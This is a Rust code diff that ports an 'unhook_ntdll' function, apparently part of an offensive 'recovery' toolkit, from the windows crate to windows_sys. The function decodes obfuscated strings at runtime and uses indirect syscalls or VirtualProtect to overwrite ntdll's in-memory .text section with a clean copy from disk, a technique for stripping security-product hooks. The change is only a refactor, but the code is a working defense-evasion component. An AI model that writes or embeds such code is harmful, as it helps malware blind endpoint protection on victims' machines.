@@ -3,9 +3,8 @@ use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_S
 use crate::recovery::helpers::syscalls::{SyscallManager, indirect_syscall_5};
 use std::fs;
 use tracing::{debug, info};
-use windows::Win32::System::LibraryLoader::GetModuleHandleW;
-use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
-use windows::core::PCWSTR;
+use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
+use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
 
 pub fn unhook_ntdll(
     syscall_manager: Option<&SyscallManager>,
@@ -15,8 +14,11 @@ pub fn unhook_ntdll(
     unsafe {
         // "ntdll.dll"
         let ntdll_name = deobf_w(&[0xB0, 0x5B, 0x77, 0xE3, 0x42, 0xD4, 0x19, 0x70, 0xA5]);
-        let h_ntdll = GetModuleHandleW(PCWSTR(ntdll_name.as_ptr()))?;
-        let ntdll_base = h_ntdll.0 as *const u8;
+        let h_ntdll = GetModuleHandleW(ntdll_name.as_ptr()) as isize;
+        if h_ntdll == 0 {
+            return Err("failed to get ntdll module handle".into());
+        }
+        let ntdll_base = h_ntdll as *const u8;
 
         // "C:\\Windows\\System32\\ntdll.dll"
         let ntdll_path = deobf(&[
@@ -64,14 +66,16 @@ pub fn unhook_ntdll(
                         -1,
                         &mut addr as *mut _ as isize,
                         &mut size as *mut _ as isize,
-                        PAGE_EXECUTE_READWRITE.0 as isize,
+                        PAGE_EXECUTE_READWRITE as isize,
                         &mut old_protect as *mut _ as isize,
                     );
                 } else {
-                    use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VirtualProtect};
-                    let mut op = PAGE_PROTECTION_FLAGS::default();
-                    VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &mut op)?;
-                    old_protect = op.0;
+                    use windows_sys::Win32::System::Memory::VirtualProtect;
+                    let mut op = 0u32;
+                    if VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &mut op) == 0 {
+                        return Err("VirtualProtect failed".into());
+                    }
+                    old_protect = op;
                 }
 
                 let disk_section_ptr = ntdll_disk_bytes
@@ -95,14 +99,16 @@ pub fn unhook_ntdll(
                         &mut temp as *mut _ as isize,
                     );
                 } else {
-                    use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VirtualProtect};
-                    let mut op = PAGE_PROTECTION_FLAGS::default();
-                    VirtualProtect(
+                    use windows_sys::Win32::System::Memory::VirtualProtect;
+                    let mut op = 0u32;
+                    if VirtualProtect(
                         addr,
                         size,
-                        windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(old_protect),
+                        old_protect,
                         &mut op,
-                    )?;
+                    ) == 0 {
+                        return Err("VirtualProtect (restore) failed".into());
+                    }
                 }
 
                 info!("successfully unhooked .text section of ntdll.dll");
